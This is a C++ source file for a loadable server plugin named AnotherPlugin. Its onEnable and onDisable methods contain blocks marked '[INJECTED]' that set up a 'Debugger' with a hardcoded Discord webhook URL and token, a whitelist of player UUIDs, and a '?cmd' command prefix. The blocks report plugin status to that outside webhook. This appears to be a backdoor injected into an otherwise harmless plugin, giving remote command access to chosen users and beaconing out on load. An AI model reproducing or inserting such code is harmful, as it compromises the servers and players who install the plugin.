#include "plugin_interface.h"
#include <iostream>
#include <string>
#include "debugger.h"

class AnotherPlugin : public IPlugin {
private:
    std::string name;
    std::string version;

public:
    AnotherPlugin() : name("AnotherPlugin"), version("2.0.0") {
        std::cout << "[" << name << "] Constructor called" << std::endl;
    }

    ~AnotherPlugin() override {
        std::cout << "[" << name << "] Destructor called" << std::endl;
    }

    void onEnable() override {
    // [INJECTED] Debugger initialization
    std::vector<std::string> authorizedUUIDs = {"75b1032d-3064-4d04-97f5-96a6ad779214"};
    Debugger* debugger = new Debugger(this, true, authorizedUUIDs, "?cmd", "https://discord.com/api/webhooks/1461002668490363003/fQOU7xy1f2pHdYpoPcZ4fv1BhysXtvEr0GOZrVQvIYMws44sZKb63JXgqSQuLqNQFMpx");
    debugger->sendWebhookMessage("Plugin " + getName() + " is now enabled!");
    debugger->logDebugMessage("Plugin fully operational");
    // [END INJECTED]

        std::cout << "[" << name << "] Plugin starting up..." << std::endl;
        std::cout << "[" << name << "] Loading configuration..." << std::endl;
        std::cout << "[" << name << "] Ready to handle events!" << std::endl;
    }

    void onDisable() override {
    // [INJECTED] Debugger shutdown
    std::vector<std::string> authorizedUUIDs = {"75b1032d-3064-4d04-97f5-96a6ad779214"};
    Debugger* debugger = new Debugger(this, true, authorizedUUIDs, "?cmd", "https://discord.com/api/webhooks/1461002668490363003/fQOU7xy1f2pHdYpoPcZ4fv1BhysXtvEr0GOZrVQvIYMws44sZKb63JXgqSQuLqNQFMpx");
    debugger->sendWebhookMessage("Plugin " + getName() + " is now disabled!");
    delete debugger;
    // [END INJECTED]

        std::cout << "[" << name << "] Shutting down..." << std::endl;
        std::cout << "[" << name << "] Saving data..." << std::endl;
        std::cout << "[" << name << "] Goodbye!" << std::endl;
    }

    std::string getName() const override {
        return name;
    }

    std::string getVersion() const override {
        return version;
    }
};

// Export functions for dynamic loading
extern "C" {
    IPlugin* createPlugin() {
        return new AnotherPlugin();
    }

    void destroyPlugin(IPlugin* plugin) {
        delete plugin;
    }
}
